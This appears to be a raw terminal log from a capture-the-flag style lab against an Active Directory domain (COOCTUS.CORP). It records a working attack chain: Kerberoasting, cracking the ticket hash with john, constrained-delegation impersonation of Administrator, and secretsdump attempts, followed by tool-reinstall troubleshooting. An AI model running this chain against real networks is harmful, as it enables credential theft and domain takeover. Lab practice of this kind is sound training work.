@@ -1,0 +1,1690 @@
+stat: prhash.txt: No such file or directory
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cp Visitor.ccache hash.txt
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --format=krb5tgs prhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+stat: prhash.txt: No such file or directory
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Warning: invalid UTF-8 seen reading hash.txt
+Using default input encoding: UTF-8
+No password hashes loaded (see FAQ)
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-GetUserSPNs -request -k -dc-ip target.thm COOCTUS.CORP/Visitor:'GuestLogin!'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Getting machine hostname
+[-] CCache file is not found. Skipping...
+ServicePrincipalName  Name            MemberOf  PasswordLastSet             LastLogon                   Delegation
+--------------------  --------------  --------  --------------------------  --------------------------  -----------
+HTTP/dc.cooctus.corp  password-reset            2021-06-08 16:00:39.356663  2021-06-08 15:46:23.369540  constrained
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$879bd0e999943e7c3b95634b03f781b0$60bbfcf91b67482d96ed19239e27553737a9dc28c4ea7870f544e49673e40a1523ef6b90076e81d2bbb57e8b0f95229dbb82f36b30ef5d2a91ad3a095da76dad2a9d4b8be759fe6bbde25c7aaedf8cab0af2f89d77cf3433b02911eb19ac320aa34d9775c15c04524cc5cbfbe568211bde61b1003d4e94e63d6edf0ac328bb3805f43f7b3bde6e348780c8914b63dd95e498e53eb046cb5c8716f656713efe00e4fe03d1759298c4a2923ce7b5f720c5f434d66b788ceddc9c2d082fd4ada6a097f4b1fc699f1a9c7004095a95c9ab21dbc2dfec4b1f10bcc8226bc80c96229c6fe6998688a92419d1efa9d10b35db7713eb143f84ca26bf2e185e9b49b144d951b1fd93f4c241133e0c6f67e35173d44d460064e730dc061f7815ab2fbb470f8584d7995a02ca0d99902714e3b4525ab2543e18390d4d4bd3759878414137afd2a7483a16f6fbddd5ea55187a522a0b8dfe582c6182a7d5e4043b61a852050a41211154952ba4e5ec9b6b91e25b5ec66be18b42d65b8073e7a5aa6f0fd53f57df36a6cba3750a5c9bd3e77a9112d34a0fd3a0a9d27e04b2e2229095ab25dad69d19b3f4649cf2567ce23522d1ea729747703edb968a848b26884ac2d9449f805f496a1eefe2a9323ad9a304f58f13ed19abdd221b2bac3770874486426eef51015a1d994dc154a415723c18c3ecb7ee1e424df8a305226c99bfb31e70623b1817fef93e173814a368464c4d0c43a698ad7ef8d8a5680bed4e7b7ec92f5ed6b808516a8647ced7e14544f0b5f790a269777560d0b180f5e86e565e1b80ce83b3e3ebeb58bf34b71199c4fa73181f5715a0131deccd8f045cb66d807214c75812f2077032bda05e2b8c653f96171f86ae46d992edb9eb3bb624bcf16151d736a3ec5a31c2eb17daea8c35fc50442c13d69e431459824d9c20c0db481e9e571263188b9d2ccbba35e561996ba524fe4bae09cce79bf452c595bcaef9f3b34b72d7323be6cb6bfd78a99a89b6addb840585085bab3e3f65ba7ce63d1021c824c07b248218e03e06113a82292265c7656ea1e4acdb7501213ec8acf559110ce8307d75299412fe56bce4d21579339526e735b39588e109b40bc9652bcb12e38991cd38b921e152cbfff87754aa56231fbf88880f2ba157a6865c7c5f5156d7223a6276111cd8686e3a4e619b6639e4802c403f27591d59e3e69ccb8c87ad0651b76536f5eeb7ed220fb5b6e02ca2376c345074c047bf2e0059655e2171e634d72cf2215b37dd5155f1c59ffd43a9bec1c044932e7022bc9dc07478eb3bf6c4a7a266bd9e9f0153b377299d8a4904940f5184f478e8ac96e08c0ef7edf48b
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ echo "$krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$879bd0e999943e7c3b95634b03f781b0$60bbfcf91b67482d96ed19239e27553737a9dc28c4ea7870f544e49673e40a1523ef6b90076e81d2bbb57e8b0f95229dbb82f36b30ef5d2a91ad3a095da76dad2a9d4b8be759fe6bbde25c7aaedf8cab0af2f89d77cf3433b02911eb19ac320aa34d9775c15c04524cc5cbfbe568211bde61b1003d4e94e63d6edf0ac328bb3805f43f7b3bde6e348780c8914b63dd95e498e53eb046cb5c8716f656713efe00e4fe03d1759298c4a2923ce7b5f720c5f434d66b788ceddc9c2d082fd4ada6a097f4b1fc699f1a9c7004095a95c9ab21dbc2dfec4b1f10bcc8226bc80c96229c6fe6998688a92419d1efa9d10b35db7713eb143f84ca26bf2e185e9b49b144d951b1fd93f4c241133e0c6f67e35173d44d460064e730dc061f7815ab2fbb470f8584d7995a02ca0d99902714e3b4525ab2543e18390d4d4bd3759878414137afd2a7483a16f6fbddd5ea55187a522a0b8dfe582c6182a7d5e4043b61a852050a41211154952ba4e5ec9b6b91e25b5ec66be18b42d65b8073e7a5aa6f0fd53f57df36a6cba3750a5c9bd3e77a9112d34a0fd3a0a9d27e04b2e2229095ab25dad69d19b3f4649cf2567ce23522d1ea729747703edb968a848b26884ac2d9449f805f496a1eefe2a9323ad9a304f58f13ed19abdd221b2bac3770874486426eef51015a1d994dc154a415723c18c3ecb7ee1e424df8a305226c99bfb31e70623b1817fef93e173814a368464c4d0c43a698ad7ef8d8a5680bed4e7b7ec92f5ed6b808516a8647ced7e14544f0b5f790a269777560d0b180f5e86e565e1b80ce83b3e3ebeb58bf34b71199c4fa73181f5715a0131deccd8f045cb66d807214c75812f2077032bda05e2b8c653f96171f86ae46d992edb9eb3bb624bcf16151d736a3ec5a31c2eb17daea8c35fc50442c13d69e431459824d9c20c0db481e9e571263188b9d2ccbba35e561996ba524fe4bae09cce79bf452c595bcaef9f3b34b72d7323be6cb6bfd78a99a89b6addb840585085bab3e3f65ba7ce63d1021c824c07b248218e03e06113a82292265c7656ea1e4acdb7501213ec8acf559110ce8307d75299412fe56bce4d21579339526e735b39588e109b40bc9652bcb12e38991cd38b921e152cbfff87754aa56231fbf88880f2ba157a6865c7c5f5156d7223a6276111cd8686e3a4e619b6639e4802c403f27591d59e3e69ccb8c87ad0651b76536f5eeb7ed220fb5b6e02ca2376c345074c047bf2e0059655e2171e634d72cf2215b37dd5155f1c59ffd43a9bec1c044932e7022bc9dc07478eb3bf6c4a7a266bd9e9f0153b377299d8a4904940f5184f478e8ac96e08c0ef7edf48b" > hash.txt
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+No password hashes loaded (see FAQ)
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat hash.txt
+password-reset.CORP.CORP/password-reset*bd0e999943e7c3b95634b03f781b0bbfcf91b67482d96ed19239e27553737a9dc28c4ea7870f544e49673e40a1523ef6b90076e81d2bbb57e8b0f95229dbb82f36b30ef5d2a91ad3a095da76dad2a9d4b8be759fe6bbde25c7aaedf8cab0af2f89d77cf3433b02911eb19ac320aa34d9775c15c04524cc5cbfbe568211bde61b1003d4e94e63d6edf0ac328bb3805f43f7b3bde6e348780c8914b63dd95e498e53eb046cb5c8716f656713efe00e4fe03d1759298c4a2923ce7b5f720c5f434d66b788ceddc9c2d082fd4ada6a097f4b1fc699f1a9c7004095a95c9ab21dbc2dfec4b1f10bcc8226bc80c96229c6fe6998688a92419d1efa9d10b35db7713eb143f84ca26bf2e185e9b49b144d951b1fd93f4c241133e0c6f67e35173d44d460064e730dc061f7815ab2fbb470f8584d7995a02ca0d99902714e3b4525ab2543e18390d4d4bd3759878414137afd2a7483a16f6fbddd5ea55187a522a0b8dfe582c6182a7d5e4043b61a852050a41211154952ba4e5ec9b6b91e25b5ec66be18b42d65b8073e7a5aa6f0fd53f57df36a6cba3750a5c9bd3e77a9112d34a0fd3a0a9d27e04b2e2229095ab25dad69d19b3f4649cf2567ce23522d1ea729747703edb968a848b26884ac2d9449f805f496a1eefe2a9323ad9a304f58f13ed19abdd221b2bac3770874486426eef51015a1d994dc154a415723c18c3ecb7ee1e424df8a305226c99bfb31e70623b1817fef93e173814a368464c4d0c43a698ad7ef8d8a5680bed4e7b7ec92f5ed6b808516a8647ced7e14544f0b5f790a269777560d0b180f5e86e565e1b80ce83b3e3ebeb58bf34b71199c4fa73181f5715a0131deccd8f045cb66d807214c75812f2077032bda05e2b8c653f96171f86ae46d992edb9eb3bb624bcf16151d736a3ec5a31c2eb17daea8c35fc50442c13d69e431459824d9c20c0db481e9e571263188b9d2ccbba35e561996ba524fe4bae09cce79bf452c595bcaef9f3b34b72d7323be6cb6bfd78a99a89b6addb840585085bab3e3f65ba7ce63d1021c824c07b248218e03e06113a82292265c7656ea1e4acdb7501213ec8acf559110ce8307d75299412fe56bce4d21579339526e735b39588e109b40bc9652bcb12e38991cd38b921e152cbfff87754aa56231fbf88880f2ba157a6865c7c5f5156d7223a6276111cd8686e3a4e619b6639e4802c403f27591d59e3e69ccb8c87ad0651b76536f5eeb7ed220fb5b6e02ca2376c345074c047bf2e0059655e2171e634d72cf2215b37dd5155f1c59ffd43a9bec1c044932e7022bc9dc07478eb3bf6c4a7a266bd9e9f0153b377299d8a4904940f5184f478e8ac96e08c0ef7edf48b
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ echo  > hash.txt
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ echo '$krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$879bd0e999943e7c3b95634b03f781b0$60bbfcf91b67482d96ed19239e27553737a9dc28c4ea7870f544e49673e40a1523ef6b90076e81d2bbb57e8b0f95229dbb82f36b30ef5d2a91ad3a095da76dad2a9d4b8be759fe6bbde25c7aaedf8cab0af2f89d77cf3433b02911eb19ac320aa34d9775c15c04524cc5cbfbe568211bde61b1003d4e94e63d6edf0ac328bb3805f43f7b3bde6e348780c8914b63dd95e498e53eb046cb5c8716f656713efe00e4fe03d1759298c4a2923ce7b5f720c5f434d66b788ceddc9c2d082fd4ada6a097f4b1fc699f1a9c7004095a95c9ab21dbc2dfec4b1f10bcc8226bc80c96229c6fe6998688a92419d1efa9d10b35db7713eb143f84ca26bf2e185e9b49b144d951b1fd93f4c241133e0c6f67e35173d44d460064e730dc061f7815ab2fbb470f8584d7995a02ca0d99902714e3b4525ab2543e18390d4d4bd3759878414137afd2a7483a16f6fbddd5ea55187a522a0b8dfe582c6182a7d5e4043b61a852050a41211154952ba4e5ec9b6b91e25b5ec66be18b42d65b8073e7a5aa6f0fd53f57df36a6cba3750a5c9bd3e77a9112d34a0fd3a0a9d27e04b2e2229095ab25dad69d19b3f4649cf2567ce23522d1ea729747703edb968a848b26884ac2d9449f805f496a1eefe2a9323ad9a304f58f13ed19abdd221b2bac3770874486426eef51015a1d994dc154a415723c18c3ecb7ee1e424df8a305226c99bfb31e70623b1817fef93e173814a368464c4d0c43a698ad7ef8d8a5680bed4e7b7ec92f5ed6b808516a8647ced7e14544f0b5f790a269777560d0b180f5e86e565e1b80ce83b3e3ebeb58bf34b71199c4fa73181f5715a0131deccd8f045cb66d807214c75812f2077032bda05e2b8c653f96171f86ae46d992edb9eb3bb624bcf16151d736a3ec5a31c2eb17daea8c35fc50442c13d69e431459824d9c20c0db481e9e571263188b9d2ccbba35e561996ba524fe4bae09cce79bf452c595bcaef9f3b34b72d7323be6cb6bfd78a99a89b6addb840585085bab3e3f65ba7ce63d1021c824c07b248218e03e06113a82292265c7656ea1e4acdb7501213ec8acf559110ce8307d75299412fe56bce4d21579339526e735b39588e109b40bc9652bcb12e38991cd38b921e152cbfff87754aa56231fbf88880f2ba157a6865c7c5f5156d7223a6276111cd8686e3a4e619b6639e4802c403f27591d59e3e69ccb8c87ad0651b76536f5eeb7ed220fb5b6e02ca2376c345074c047bf2e0059655e2171e634d72cf2215b37dd5155f1c59ffd43a9bec1c044932e7022bc9dc07478eb3bf6c4a7a266bd9e9f0153b377299d8a4904940f5184f478e8ac96e08c0ef7edf48b' > hash.txt
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat hash.txt
+$krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$879bd0e999943e7c3b95634b03f781b0$60bbfcf91b67482d96ed19239e27553737a9dc28c4ea7870f544e49673e40a1523ef6b90076e81d2bbb57e8b0f95229dbb82f36b30ef5d2a91ad3a095da76dad2a9d4b8be759fe6bbde25c7aaedf8cab0af2f89d77cf3433b02911eb19ac320aa34d9775c15c04524cc5cbfbe568211bde61b1003d4e94e63d6edf0ac328bb3805f43f7b3bde6e348780c8914b63dd95e498e53eb046cb5c8716f656713efe00e4fe03d1759298c4a2923ce7b5f720c5f434d66b788ceddc9c2d082fd4ada6a097f4b1fc699f1a9c7004095a95c9ab21dbc2dfec4b1f10bcc8226bc80c96229c6fe6998688a92419d1efa9d10b35db7713eb143f84ca26bf2e185e9b49b144d951b1fd93f4c241133e0c6f67e35173d44d460064e730dc061f7815ab2fbb470f8584d7995a02ca0d99902714e3b4525ab2543e18390d4d4bd3759878414137afd2a7483a16f6fbddd5ea55187a522a0b8dfe582c6182a7d5e4043b61a852050a41211154952ba4e5ec9b6b91e25b5ec66be18b42d65b8073e7a5aa6f0fd53f57df36a6cba3750a5c9bd3e77a9112d34a0fd3a0a9d27e04b2e2229095ab25dad69d19b3f4649cf2567ce23522d1ea729747703edb968a848b26884ac2d9449f805f496a1eefe2a9323ad9a304f58f13ed19abdd221b2bac3770874486426eef51015a1d994dc154a415723c18c3ecb7ee1e424df8a305226c99bfb31e70623b1817fef93e173814a368464c4d0c43a698ad7ef8d8a5680bed4e7b7ec92f5ed6b808516a8647ced7e14544f0b5f790a269777560d0b180f5e86e565e1b80ce83b3e3ebeb58bf34b71199c4fa73181f5715a0131deccd8f045cb66d807214c75812f2077032bda05e2b8c653f96171f86ae46d992edb9eb3bb624bcf16151d736a3ec5a31c2eb17daea8c35fc50442c13d69e431459824d9c20c0db481e9e571263188b9d2ccbba35e561996ba524fe4bae09cce79bf452c595bcaef9f3b34b72d7323be6cb6bfd78a99a89b6addb840585085bab3e3f65ba7ce63d1021c824c07b248218e03e06113a82292265c7656ea1e4acdb7501213ec8acf559110ce8307d75299412fe56bce4d21579339526e735b39588e109b40bc9652bcb12e38991cd38b921e152cbfff87754aa56231fbf88880f2ba157a6865c7c5f5156d7223a6276111cd8686e3a4e619b6639e4802c403f27591d59e3e69ccb8c87ad0651b76536f5eeb7ed220fb5b6e02ca2376c345074c047bf2e0059655e2171e634d72cf2215b37dd5155f1c59ffd43a9bec1c044932e7022bc9dc07478eb3bf6c4a7a266bd9e9f0153b377299d8a4904940f5184f478e8ac96e08c0ef7edf48b
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+resetpassword    (?)
+1g 0:00:00:00 DONE (2026-09-09 10:11) 5.000g/s 1187Kp/s 1187Kc/s 1187KC/s rikelme..nichel
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-findDelegation -dc-ip target.thm COOCTUS.CORP/password-reset:'resetpassword'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+AccountName     AccountType  DelegationType                      DelegationRightsTo                   SPN Exists
+--------------  -----------  ----------------------------------  -----------------------------------  ----------
+DC$             Computer     Unconstrained                       N/A                                  Yes
+password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS.CORP  No
+password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP               No
+password-reset  Person       Constrained w/ Protocol Transition  oakley/DC                            No
+password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS       No
+password-reset  Person       Constrained w/ Protocol Transition  oakley/DC/COOCTUS                    No
+
+
+
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-getTGT COOCTUS.CORP/password-reset:'resetpassword'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in password-reset.ccache
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-getTGT COOCTUS.CORP/password-reset:'resetpassword' -dc-ip target.thm
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in password-reset.ccache
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ export KRB5CCNAME=password-reset.ccache
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-getST -k -spn oakley/DC. COOCTUS.CORP/password-reset:'resetpassword' -dc-ip target.thm
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-getST -k -spn oakley/DC.COOCTUS.CORP -impersonate Administrator COOCTUS.CORP/password-reset:'resetpassword'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ export KRB5CCNAME=Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ mv Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache Administrator.ccache
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ export KRB5CCNAME=Administrator.ccache
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-secretsdump -no-pass -k DC.COOCTUS.CORP
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
+[*] Cleaning up...
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ apt-cache policy python3-impacket
+
+python3-impacket:
+  Installed: 0.13.0+git20251120-9c2d8b6-0kali1
+  Candidate: 0.13.0+git20251120-9c2d8b6-0kali1
+  Version table:
+ *** 0.13.0+git20251120-9c2d8b6-0kali1 500
+        500 http://http.kali.org/kali kali-rolling/main amd64 Packages
+        100 /var/lib/dpkg/status
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ export VERSION=0.11.0kali1
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo apt install python3-impacket=VERSION
+
+[sudo] password for kali:
+Package python3-impacket is not available, but is referred to by another package.
+This may mean that the package is missing, has been obsoleted, or
+is only available from another source
+
+Error: Version 'VERSION' for 'python3-impacket' was not found
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ export VERSION=0.11.0
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo apt install python3-impacket=VERSION
+
+Package python3-impacket is not available, but is referred to by another package.
+This may mean that the package is missing, has been obsoleted, or
+is only available from another source
+
+Error: Version 'VERSION' for 'python3-impacket' was not found
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo nano /etc/hosts
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-secretsdump -no-pass -k DC.COOCTUS.CORP
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
+[*] Cleaning up...
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-secretsdump -no-pass -k DC.COOCTUS.CORP -just-dc-user
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+usage: secretsdump.py [-h] [-ts] [-debug] [-system SYSTEM] [-bootkey BOOTKEY] [-security SECURITY] [-sam SAM]
+                      [-ntds NTDS] [-resumefile RESUMEFILE] [-skip-sam] [-skip-security]
+                      [-outputfile OUTPUTFILE] [-use-vss] [-rodcNo RODCNO] [-rodcKey RODCKEY] [-use-keylist]
+                      [-exec-method [{smbexec,wmiexec,mmcexec}]] [-use-remoteSSWMI] [-use-remoteSSWMI-NTDS]
+                      [-remoteSSWMI-remote-volume REMOTESSWMI_REMOTE_VOLUME]
+                      [-remoteSSWMI-local-path REMOTESSWMI_LOCAL_PATH] [-just-dc-user USERNAME]
+                      [-ldapfilter LDAPFILTER] [-just-dc] [-just-dc-ntlm] [-skip-user SKIP_USER]
+                      [-pwd-last-set] [-user-status] [-history] [-hashes LMHASH:NTHASH] [-no-pass] [-k]
+                      [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address] [-target-ip ip address]
+                      target
+secretsdump.py: error: argument -just-dc-user: expected one argument
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-secretsdump -no-pass -k DC.COOCTUS.CORP -just-dc-user Administrator
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)
+[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
+[*] Cleaning up...
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-secretsdump -no-pass -k DC.COOCTUS.CORP
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
+[*] Cleaning up...
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ wget https://github.com/fortra/impacket/releases/download/impacket_0_11_0/impacket-0.11.0.tar.gz
+--2026-09-09 11:06:31--  https://github.com/fortra/impacket/releases/download/impacket_0_11_0/impacket-0.11.0.tar.gz
+Resolving github.com (github.com)... 20.207.73.82
+Connecting to github.com (github.com)|20.207.73.82|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://release-assets.githubusercontent.com/github-production-release-asset/33997353/39ed122e-5943-4059-a5b4-420af598de17?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-09-09T17%3A54%3A58Z&rscd=attachment%3B+filename%3Dimpacket-0.11.0.tar.gz&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-09-09T16%3A54%3A14Z&ske=2026-09-09T17%3A54%3A58Z&sks=b&skv=2018-11-09&sig=Ho25O2sP6l19EXDOyNjIl7iKVAn8gpHrYKTZ3DnJiDg%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc4ODk3Mzg5MiwibmJmIjoxNzg4OTczNTkyLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.E7eMv6h8vKufA363no85niO5ljtJyhfWSdVnpYpFruc&response-content-disposition=attachment%3B%20filename%3Dimpacket-0.11.0.tar.gz&response-content-type=application%2Foctet-stream [following]
+--2026-09-09 11:06:32--  https://release-assets.githubusercontent.com/github-production-release-asset/33997353/39ed122e-5943-4059-a5b4-420af598de17?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-09-09T17%3A54%3A58Z&rscd=attachment%3B+filename%3Dimpacket-0.11.0.tar.gz&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-09-09T16%3A54%3A14Z&ske=2026-09-09T17%3A54%3A58Z&sks=b&skv=2018-11-09&sig=Ho25O2sP6l19EXDOyNjIl7iKVAn8gpHrYKTZ3DnJiDg%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc4ODk3Mzg5MiwibmJmIjoxNzg4OTczNTkyLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.E7eMv6h8vKufA363no85niO5ljtJyhfWSdVnpYpFruc&response-content-disposition=attachment%3B%20filename%3Dimpacket-0.11.0.tar.gz&response-content-type=application%2Foctet-stream
+Resolving release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
+Connecting to release-assets.githubusercontent.com (release-assets.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1502931 (1.4M) [application/octet-stream]
+Saving to: ‘impacket-0.11.0.tar.gz’
+
+impacket-0.11.0.tar.gz      100%[===========================================>]   1.43M  --.-KB/s    in 0.05s
+
+2026-09-09 11:06:32 (26.5 MB/s) - ‘impacket-0.11.0.tar.gz’ saved [1502931/1502931]
+
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ tar -xzf impacket-0.11.0.tar.gz
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ls
+ Administrator.ccache                         exrex                    site-main.md
+ ap-south-1-everroveractual-premium.ovpn      gob-1.log                site-robots.txt
+ athena                                       hash.txt                 THM_Checkmate
+ brr                                          impacket-0.11.0          THM_DogCat
+ coorectusr.txt                               impacket-0.11.0.tar.gz   thmenv
+ cupp                                         inacave                  THM__PP
+ curlevro                                     ldapenum.log             user.txt
+ CVE-2021-26828_ScadaBR_RCE                   listofusers.txt          validhackers-1.log
+ cyberpunk2077                                nmapop.log               validhackers.log
+'eu-west-3-everroveractual-regular(1).ovpn'   password-reset.ccache    Visitor.ccache
+ eu-west-3-everroveractual-regular.ovpn       scheme-catcher
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cd impacket-0.11.0
+
+┌──(kali㉿kali)-[~/Downloads/impacket-0.11.0]
+└─$ ls
+ChangeLog.md  impacket           LICENSE      PKG-INFO   requirements.txt  setup.cfg  TESTING.md  tox.ini
+examples      impacket.egg-info  MANIFEST.in  README.md  SECURITY.md       setup.py   tests
+
+┌──(kali㉿kali)-[~/Downloads/impacket-0.11.0]
+└─$ cd ..
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ls
+ Administrator.ccache                         exrex                    site-main.md
+ ap-south-1-everroveractual-premium.ovpn      gob-1.log                site-robots.txt
+ athena                                       hash.txt                 THM_Checkmate
+ brr                                          impacket-0.11.0          THM_DogCat
+ coorectusr.txt                               impacket-0.11.0.tar.gz   thmenv
+ cupp                                         inacave                  THM__PP
+ curlevro                                     ldapenum.log             user.txt
+ CVE-2021-26828_ScadaBR_RCE                   listofusers.txt          validhackers-1.log
+ cyberpunk2077                                nmapop.log               validhackers.log
+'eu-west-3-everroveractual-regular(1).ovpn'   password-reset.ccache    Visitor.ccache
+ eu-west-3-everroveractual-regular.ovpn       scheme-catcher
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ pip install -r impacket-0.11.0/requirements.txt
+error: externally-managed-environment
+
+× This environment is externally managed
+╰─> To install Python packages system-wide, try apt install
+    python3-xyz, where xyz is the package you are trying to
+    install.
+
+    If you wish to install a non-Kali-packaged Python package,
+    create a virtual environment using python3 -m venv path/to/venv.
+    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
+    sure you have pypy3-venv installed.
+
+    If you wish to install a non-Kali-packaged Python application,
+    it may be easiest to use pipx install xyz, which will manage a
+    virtual environment for you. Make sure you have pipx installed.
+
+    For more information, refer to the following:
+    * https://www.kali.org/docs/general-use/python3-external-packages/
+    * /usr/share/doc/python3.13/README.venv
+
+note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.
+hint: See PEP 668 for the detailed specification.
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ source thmenv/bin/activate
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ pip install -r impacket-0.11.0/requirements.txt
+Ignoring pyreadline: markers 'sys_platform == "win32"' don't match your environment
+Collecting future (from -r impacket-0.11.0/requirements.txt (line 1))
+  Downloading future-1.0.0-py3-none-any.whl.metadata (4.0 kB)
+Collecting six (from -r impacket-0.11.0/requirements.txt (line 2))
+  Using cached six-1.17.0-py2.py3-none-any.whl.metadata (1.7 kB)
+Collecting charset_normalizer (from -r impacket-0.11.0/requirements.txt (line 3))
+  Downloading charset_normalizer-3.5.1-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (45 kB)
+Collecting pyasn1>=0.2.3 (from -r impacket-0.11.0/requirements.txt (line 4))
+  Downloading pyasn1-0.6.4-py3-none-any.whl.metadata (8.4 kB)
+Collecting pycryptodomex (from -r impacket-0.11.0/requirements.txt (line 5))
+  Downloading pycryptodomex-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
+Collecting pyOpenSSL>=21.0.0 (from -r impacket-0.11.0/requirements.txt (line 6))
+  Downloading pyopenssl-26.4.0-py3-none-any.whl.metadata (22 kB)
